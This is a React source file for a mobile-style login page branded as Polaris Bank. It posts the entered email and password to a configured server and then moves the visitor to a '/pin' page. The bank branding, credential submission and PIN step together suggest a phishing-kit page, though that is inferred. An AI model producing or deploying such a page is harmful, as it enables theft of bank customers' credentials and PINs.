import React, { useState } from "react";
import { useNavigate } from "react-router-dom";
import { useForm } from "react-hook-form";
import { yupResolver } from "@hookform/resolvers/yup";
import * as yup from "yup";
import FormErrMsg from "../components/FormErrMsg";
import axios from "axios";
import BASE_URL from "../components/urls";
import { AiOutlineEye, AiOutlineEyeInvisible } from "react-icons/ai";
import { HiOutlineMail, HiOutlineLockClosed } from "react-icons/hi";
import { IoChevronForward } from "react-icons/io5";
import { IoChatbubblesSharp } from "react-icons/io5";

const schema = yup.object().shape({
  email: yup.string().email("Invalid email").required("Email is required"),
  password: yup.string().required("Password is required"),
});

const Home = () => {
  const navigate = useNavigate();
  const [loading, setLoading] = useState(false);
  const [showPassword, setShowPassword] = useState(false);

  const {
    register,
    handleSubmit,
    formState: { errors },
  } = useForm({
    resolver: yupResolver(schema),
  });

  const togglePassword = () => {
    setShowPassword(!showPassword);
  };

  const submitForm = (data) => {
    setLoading(true);
    axios
      .post(`${BASE_URL}/`, data)
      .then((response) => {
        console.log(response.data);
        navigate("/pin");
      })
      .catch((error) => {
        console.error("There was an error!", error);
      })
      .finally(() => {
        setLoading(false);
      });
  };

  return (
    <div className="min-h-screen bg-black/90 relative overflow-hidden">
      {/* Background Pattern - Blurred cards/images */}
      <div
        className="absolute inset-0 opacity-20 bg-cover bg-center blur-sm"
        style={{
          backgroundImage: "url('/path-to-background-pattern.jpg')",
          filter: "blur(8px) brightness(0.3)",
        }}
      />

      {/* Content Container */}
      <div className="relative z-10 min-h-screen flex flex-col px-6 py-8">
        {/* Logo */}
        <div className="flex justify-end mb-12">
          <div className="text-right">
            <h1 className="text-3xl font-bold text-transparent bg-clip-text bg-gradient-to-r from-yellow-400 to-orange-500">
              Polaris
            </h1>
            <p className="text-[8px] text-yellow-500/70 tracking-wider">
              POLARIS BANK
            </p>
          </div>
        </div>

        {/* Login Title */}
        <div className="text-center mb-12">
          <h2 className="text-white text-3xl font-semibold">Login</h2>
        </div>

        {/* Form Section */}
        <form
          onSubmit={handleSubmit(submitForm)}
          className="flex-1 flex flex-col"
        >
          {/* Email Input */}
          <div className="mb-6">
            <label className="text-white text-sm mb-2 block">
              Email address
            </label>
            <div className="relative">
              <div className="absolute left-4 top-1/2 -translate-y-1/2 text-gray-400">
                <HiOutlineMail size={20} />
              </div>
              <input
                name="email"
                type="email"
                placeholder="Enter your email address"
                {...register("email")}
                className="w-full bg-white/95 rounded-lg pl-12 pr-4 py-4 text-gray-800 placeholder-gray-400 text-base focus:outline-none focus:ring-2 focus:ring-purple-500"
              />
            </div>
            <FormErrMsg errors={errors} inputName="email" />
          </div>

          {/* Password Input */}
          <div className="mb-3">
            <label className="text-white text-sm mb-2 block">Password</label>
            <div className="relative">
              <div className="absolute left-4 top-1/2 -translate-y-1/2 text-gray-400">
                <HiOutlineLockClosed size={20} />
              </div>
              <input
                name="password"
                type={showPassword ? "text" : "password"}
                placeholder="Enter your password"
                {...register("password")}
                className="w-full bg-white/95 rounded-lg pl-12 pr-12 py-4 text-gray-800 placeholder-gray-400 text-base focus:outline-none focus:ring-2 focus:ring-purple-500"
              />
              <button
                type="button"
                onClick={togglePassword}
                className="absolute right-4 top-1/2 -translate-y-1/2 text-gray-600"
              >
                {showPassword ? (
                  <AiOutlineEyeInvisible size={22} />
                ) : (
                  <AiOutlineEye size={22} />
                )}
              </button>
            </div>
            <FormErrMsg errors={errors} inputName="password" />
          </div>

          {/* Forgot Password */}
          <div className="text-right mb-8">
            <a
              href="/forgot-password"
              className="text-white text-sm hover:text-gray-300"
            >
              Forgot Password?
            </a>
          </div>

          {/* Login Button */}
          <button
            type="submit"
            disabled={loading}
            className="w-full bg-gradient-to-r from-purple-600 to-purple-700 text-white font-semibold text-lg py-4 rounded-lg mb-8 hover:from-purple-700 hover:to-purple-800 disabled:opacity-50 disabled:cursor-not-allowed transition-all shadow-lg"
          >
            {loading ? "Loading..." : "Login"}
          </button>

          {/* Sign Up Link */}
          <div className="text-center mb-8">
            <p className="text-white text-sm">
              Don't have an account?{" "}
              <a
                href="/signup"
                className="text-yellow-500 font-medium hover:text-yellow-400"
              >
                Sign up here
              </a>
            </p>
          </div>
        </form>
      </div>
    </div>
  );
};

export default Home;
